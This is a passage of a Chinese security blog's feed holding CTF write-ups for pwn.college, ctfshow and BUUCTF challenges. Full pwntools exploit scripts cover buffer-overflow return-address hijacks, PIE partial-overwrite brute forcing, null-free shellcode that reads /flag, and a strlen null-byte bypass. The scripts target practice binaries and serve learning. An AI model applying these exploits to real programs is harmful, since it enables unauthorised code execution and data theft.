class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode= asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>output = p.recvall()<br><span class="hljs-built_in">print</span>(output.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>最后也是成功拿到了flag<br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆栈平衡问题</title>
    <link href="/2025/07/19/Questions/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98/"/>
    <url>/2025/07/19/Questions/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn的坑之堆栈平衡"><a href="#pwn的坑之堆栈平衡" class="headerlink" title="pwn的坑之堆栈平衡"></a>pwn的坑之堆栈平衡</h1><p>今天做了两道最基本的溢出题，就是劫持控制流到后门函数，思路和方法理论上是一样的，但是一道能打通一道打不通，至今百思不得其解，因此记录一下以待来日<br></p><span id="more"></span><h1 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h1><h2 id="ctfshow-pwn02"><a href="#ctfshow-pwn02" class="headerlink" title="ctfshow-pwn02"></a>ctfshow-pwn02</h2><p>第一题，是ctfshow上的题目，给了一个32位程序stack，拖到IDA里看一下，main调用了pwnme函数，溢出点在pwnme，还有一个stack函数调用的system<br><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-main.png"><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-pwnme.png"><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-stack.png"><br>然后checksec看了下只开了NX，但无所谓了，又不执行shellcode，管它NX呢<br><br>接下来就是一些算偏移，找返回地址的操作<br><br>一系列操作以后得到偏移offset&#x3D;13，stack函数的地址&#x3D;0x804850f<br><br>然后写脚本，填充好垃圾数据，没开PIE的话把stack函数的地址写死就行，写出如下一个简单的脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/ctfshow-pwn02/stack&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;32bits\n&quot;</span>)<br>returnAddr=<span class="hljs-number">0x804850f</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>运行以后就可以直接拿到shell了</p><h2 id="BUUCTF-Pwn-rip"><a href="#BUUCTF-Pwn-rip" class="headerlink" title="BUUCTF-Pwn-rip"></a>BUUCTF-Pwn-rip</h2><p>然后来到第二题，也就作妖的这题，这是BUUCTF上的题目，Pwn下的第二题rip，给了一个pwn1的64位ELF文件（从下图的file输出可以看到）<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-file.png"><br>拖到IDA里可以看到溢出点发生在main函数的gets<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-main.png"><br>然后有一个fun函数，直接调用了system<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-fun.png"><br>按道理直接劫持到这个fun就可以<br><br>那就算一下偏移，看到main里面的缓冲区在rbp-0xf，+8，offset&#x3D;23<br><br>再checksec，看到没开PIE<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-checksec.png"><br>那就可以直接在脚本里写死fun函数的地址，objdump看下fun函数在哪，如下图<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-objdump.png"><br>于是按道理，学着第一题的思路，填充好offset，把返回地址写死成0x401186就肯定可以拿到shell，脚本也是这么写的<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/pwn1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;please input\n&quot;</span>)<br>offset=<span class="hljs-number">23</span><br>returnAddr=<span class="hljs-number">0x401186</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>但是，离谱的事情出现了，每次在interactive以后都会收到EOF<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-fail.png"><br>然后，如果改成下面这样的利用脚本，就没有问题<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/pwn1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;please input\n&quot;</span>)<br>offset=<span class="hljs-number">23</span><br>returnAddr=<span class="hljs-number">0x401187</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>是的，仅仅是返回地址+1，后面又陆续尝试了别的返回地址，发现只要跳过fun函数的第一条指令，即push rbp，就可以<br><br>博主大感震撼并表示不理解，遂尝试gdb单步调试，看看到底怎么个事儿<br><br>从下面这张图可以明显看到rsp指向了我们要的0x401186，按道理ret指令结束后一定是去执行fun函数<br><br><img src="/../../photos/Questions/Pwn-Q1/debug1.png"><br>并且接着si调试，可以看到，甚至它真的进到fun函数里面了<br><br><img src="/../../photos/Questions/Pwn-Q1/debug2.png"><br>然后call system这里下个断点，可以正常执行完call指令前的所有指令<br><br><img src="/../../photos/Questions/Pwn-Q1/debug3.png"><br>但是，最离谱的是，现在，在call system这里按下c键，让它继续执行，直接就崩溃<br><img src="/../../photos/Questions/Pwn-Q1/fail.png"></p><h2 id="目前的理解"><a href="#目前的理解" class="headerlink" title="目前的理解"></a>目前的理解</h2><p>在网上搜索一番后，得知是堆栈平衡问题，在64位程序下，需要堆栈进行16位对齐，可以采用填充ret指令的方法<br><br>对于上述第二题，为什么必须要跳过push rbp指令，是因为push操作会破坏已经构造好的堆栈寄存器，所以不能劫持到0x401186<br><br>而由于第一题是32位，不存在堆栈平衡问题，所以可以按照上述方法打通<br><br>总结一下，做题时遇到莫名其妙的EOF，考虑避免劫持到带有push rbp指令的地址，如果还不行，考虑用ret指令填充到16的倍数<br></p>]]></content>
    
    
    <categories>
      
      <category>疑问和踩过的一些坑</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NULL-Free-Shellcode</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这道题说了，会将输入的内容当作代码来执行，但是会对输入的内容做一些限制<br></p><span id="more"></span><h1 id="漏洞点分析与利用"><a href="#漏洞点分析与利用" class="headerlink" title="漏洞点分析与利用"></a>漏洞点分析与利用</h1><p>这道题给了源码，也没有什么easy和hard区分，因此主要记录一个trick，即如何清除shellcode里的0x00字节<br><br>漏洞点简单介绍一下，看源代码中，留了4096个字节读取我们的输入，然后执行过滤逻辑，遇到0x00就会退出<br><br>那么如何清除0字节？根据0字节的来源有2种方法：<br><br>1 对寄存器赋值0时会产生0字节，因此避免直接使用mov指令将寄存器清零，而应该使用xor指令<br><br>2 对寄存器赋值一个较小的数字会产生0字节，因此对寄存器赋值时，如果目标值很小，需要采用先把操作数push进栈，再pop出栈到寄存器的方法&lt;br<br>有了上面的理论，就很好构造shellcode了：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode<br>ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-null-free-shellcode&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Reading 0x1000 bytes from stdin.\n&quot;</span>)<br>ioTube.send(payload)<br>response=ioTube.recvall().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br></code></pre></td></tr></table></figure><p>解释一下第一行传flag字符串参数为什么要这么写，首先&#x2F;flag只有5个字节，会产生0字节，所以用斜线（即2f）填充，但这样会导致打开文件失败，所以当复制完成后，通过右移指令把多余的2f移丢即可<br></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>String-Lengths-hard</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这题除了PIE以外，对输入还存在额外的校验，具体是什么需要我们去分析<br></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先依然是chencksec，可以看到除了cananry全部开启，大概率和PIE的那题一样，需要触发后门函数<br><br>拖到IDA里看一下果不其然，有熟悉的win_authed，并且溢出点在challenge中<br><br>所以漏洞点和PIEs类似，劫持控制流到win函数<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先看objdump看win函数的地址，最后两个字节是0x2142，然后依然是要返回到校验逻辑的后面，选择0x215e<br><br>偷个懒，具体的操作方法就不放图了，可以参考PIE那一题的Wp<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/">PIEs-hard题解</a></p><p>之后看偏移地址，IDA里看到最后dest距离rbp0x50个字节，所以offset&#x3D;0x50+0x8&#x3D;88<br><br>注意：这里的buf是malloc申请到的堆上的空间，不能看buf的地址，要从后面memcpy的操作，看出最后是把输入复制到位于栈上的dest处<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/String-Lengths/offset.png"><br>最后，最关键的地方来了，challenge会调用strlen函数对我们的输入长度存在校验，不能超过43，但光垃圾数据填充就要88个，显然不行<br><br>这里卡了很久，直到看到对strlen函数的一个说明:<br><br><em><strong>The strlen() function calculates the length of the string pointed to by s, excluding the terminating null byte (‘\0’).</strong></em><br>翻译一下就是这个函数会计算字符串的长度，直到遇到终止字节，即0x00<br><br>很好，那思路就应该是用0x00作为垃圾数据填充88字节即可，这样一看这题一下子就变得简单了，之前还卡了一个下午<br><br>也算是长了个教训，还是基础不扎实，对这些库函数还是停留在用的层面，不了解深层的实现机制……<br><br>最终的利用脚本如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>offset=<span class="hljs-number">88</span><br>returnAddr=<span class="hljs-number">0x415e</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*offset+p16(returnAddr)<br>    ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-null-write&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>    ioTube.send(payload)<br>    response=ioTube.recv().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>然后去flag.txt里找就行了<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/String-Lengths/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PIEs-hard</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>程序开启了PIE保护，因此程序每次加载的基地址都是不确定的；我们无法再得知后门函数或者shellcode的真实地址，需要通过爆破的方法拿到shell<br></p><span id="more"></span><p>通过这题记录一个小trick，有关PIE的基础理论在这里<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/">二进制总结</a></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec看一下，发现除了cananry全部保护开启，直接断绝shellcode的念头<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/checksec.png"><br>先考虑有没有后门函数，将二进制文件拖入IDA，可以看到有一个win_auth函数，同时溢出点在challenge函数<br><br>这样的话漏洞点就清晰了，就是通过覆盖challenge函数的返回地址来跳转到win_auth即可<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先计算偏移，同样在IDA里看缓冲区相对于rbp的偏移然后+8即可，算出来是120<br><br>接下来通过objdump看到win函数相对于程序装载基地址的偏移&#x3D;0x1ab2<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/win_auth.png"><br>但是这里有一个问题，我们不能跳转到0x1ab2，因为win函数入口处存在对参数值的校验，只能跳转到校验逻辑的后面，比如0x1ace<br><br>最后，我们需要覆盖最后一个半字节，爆破剩下的15位十六进制数<br><br>一个小trick，个人习惯把偏移加上个1、2左右，从做的题目来看，这样可以更早撞上（maybe程序装载基地址倒数第4位是0的概率更小？不太确定……），但不管怎么说，碰撞16次以后就有很高的概率可以碰对了<br><br>最后的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>offset=<span class="hljs-number">120</span><br>returnAddr=<span class="hljs-number">0x2ace</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p16(returnAddr)<br>    ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-pie-overflow&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>    ioTube.send(payload)<br>    response=ioTube.recv().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>脚本运行完毕后可以在当前目录的flag.txt中找到flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Control-Hijack</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们劫持函数的控制流，但具体劫持到哪，需要反汇编整个程序来决定</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先将&#x2F;challenge下的二进制文件下载到本地，拖到IDA里看一下，（F5反编译，即看C伪代码）<br><br>个人习惯首先观察main函数<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/main.png"><br>可以看到main调用了challenge，并且main里面没有发现溢出点，那只能进challenge里看一下<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/challenge.png"><br>很好，在challenge中找到了溢出点read，给了4096个字节，但缓冲区只有14个字节，完全够覆盖到返回地址<br><br>然后checksec命令查看程序开启了哪些保护<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">checksec /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure><p>如下图，发现只开了NX<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/checksec.png"><br>说明不能往栈上写shellcode<br><br>同时，观察左侧函数名一栏存在一个win函数，点进去看一下，发现是输出flag的功能，如图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/win.png"><br>至此，漏洞点就清晰了，我们需要覆盖返回地址为win函数的地址，劫持challenge函数的控制流</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先需要确定缓冲区到返回地址的偏移，记录两种方法：<br><br>第一个是通过IDA，注意challenge函数反编译的截图，在第5行buf变量后面有一个[rbp-80H]的字段，联系栈帧结构，可以知道返回地址在缓冲区的高0x80+0x8&#x3D;136字节处<br><br>第二个是通过gdb的pwndbg插件：<br><br>首先在gdb中运行反汇编命令，拿到challenge函数的ret指令的地址<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disas challenge<br></code></pre></td></tr></table></figure><p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-1.png"><br>可以看到在challenge函数+289位置，那么就在ret处打上断点<br><br>之后通过cyclic生成模式字符串，将该字符串作为输入，如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-2.png"><br>最后通过cyclic -l命令，查找rsp指向的字符串的偏移，即是返回地址的偏移<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/pwndbg-3.png"><br>之后确定win函数地址，由于没有开启PIE，可以采用objdump命令进行反汇编，直接拿到win的地址<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure><p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/objdump.png"><br>可以看到win函数在0x401c20的地方<br><br>因此可以编写出如下利用脚本了<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>ioHandler=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-control-hijack&quot;</span>)<br>offset=<span class="hljs-number">136</span><br>winAddr=<span class="hljs-number">0x401c20</span><br>ioHandler.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(winAddr)<br>ioHandler.send(payload)<br>flag=ioHandler.recvall().decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>直接运行即可拿到flag了<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制总结</title>
    <link href="/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/"/>
    <url>/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/</url>
    
